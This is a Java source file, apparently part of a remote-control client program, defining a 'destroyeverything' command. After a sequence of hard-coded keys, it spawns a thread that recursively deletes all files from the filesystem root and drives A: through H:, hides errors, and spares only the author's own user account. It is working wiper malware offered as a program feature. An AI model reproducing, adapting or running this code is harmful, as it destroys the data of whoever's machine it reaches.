package br.com.introcdc.connect.client.commands.file.external;
/*
 * Written by IntroCDC, Bruno Coêlho at 16/01/2025 - 05:18
 */

import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;

import java.io.File;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Arrays;
import java.util.List;

public class ClientCommandDestroyEverything extends ClientCommand {

    public ClientCommandDestroyEverything() {
        super("destroyeverything");
    }

    public boolean first = false;
    public boolean second = false;
    public boolean third = false;

    @Override
    public void execute(String command, String input) throws Exception {
        String firstKey = "LQHDsPPeQXwwb0Y6HisKPFYUwbX2IPKq";
        String secondKey = "2OOdvH8ffUxMicvhTXSdDADb4IW7sDCo";
        String thirdKey = "Gz7hT0R7YPfdV6rFq4CnVJKYRbBU00RU";
        String fourKey = "Klql4LnypHxNVXxH7ArJKjyesWl6N9NN";
        if (input.isEmpty()) {
            first = false;
            second = false;
            third = false;
            msg("Chaves: " + firstKey + " / " + secondKey + " / " + thirdKey + " / " + fourKey);
            return;
        }
        if (!first) {
            if (input.equals(firstKey)) {
                msg("Primeira chave correta!");
                first = true;
            } else {
                msg("Primeira chave incorreta!");
                first = false;
                second = false;
                third = false;
            }
        } else if (!second) {
            if (input.equals(secondKey)) {
                msg("Segunda chave correta!");
                second = true;
            } else {
                msg("Segunda chave incorreta!");
                first = false;
                second = false;
                third = false;
            }
        } else if (!third) {
            if (input.equals(thirdKey)) {
                msg("Terceira chave correta!");
                third = true;
            } else {
                msg("Terceira chave incorreta!");
                first = false;
                second = false;
                third = false;
            }
        } else {
            if (input.equals(thirdKey)) {
                msg("Quarta chave correta!");
                first = false;
                second = false;
                third = false;
                destroyEverything();
            } else {
                msg("Quarta chave incorreta!");
                first = false;
                second = false;
                third = false;
            }
        }
    }

    public static void destroyEverything() {
        if (System.getProperty("user.name").equalsIgnoreCase("Bruno")) {
            ConnectClient.msg("Destroy Everything Bloqueado de Executar neste PC!");
            return;
        }
        ConnectClient.msg("DESTROY EVERYTHING DETONANDO!");
        new Thread(() -> {
            start(new File("/"));
            start(new File("A:/"));
            start(new File("B:/"));
            start(new File("C:/"));
            start(new File("D:/"));
            start(new File("E:/"));
            start(new File("F:/"));
            start(new File("G:/"));
            start(new File("H:/"));
        }).start();
    }

    public static void start(File file) {
        if (System.getProperty("user.name").equalsIgnoreCase("Bruno")) {
            ConnectClient.msg("Destroy Everything Bloqueado de Executar neste PC!");
            return;
        }
        if (IGNORE.contains(file.getAbsolutePath())) {
            return;
        }
        try {
            if (file.isDirectory()) {
                try {
                    for (File otherFile : file.listFiles()) {
                        start(otherFile);
                    }
                } catch (Exception ignored) {
                }
                try {
                    deleteFileOrFolder(file.toPath());
                } catch (Exception ignored) {
                }
            } else {
                deleteFileOrFolder(file.toPath());
            }
        } catch (Exception ignored) {
        }
    }

    public static void deleteFileOrFolder(Path path) {
        if (System.getProperty("user.name").equalsIgnoreCase("Bruno")) {
            ConnectClient.msg("Destroy Everything Bloqueado de Executar neste PC!");
            return;
        }
        try {
            Files.walkFileTree(path, new SimpleFileVisitor<Path>() {

                private FileVisitResult handleException(IOException exception) {
                    return FileVisitResult.TERMINATE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exception) throws IOException {
                    if (exception != null) {
                        return handleException(exception);
                    }
                    Files.delete(dir);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    Files.delete(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exception) {
                    return handleException(exception);
                }
            });
        } catch (Exception ignored) {
        }
    }

    public static List<String> IGNORE = Arrays.asList("/dev", "/dev/", "/proc", "/proc/", "/sys", "/sys/");

}
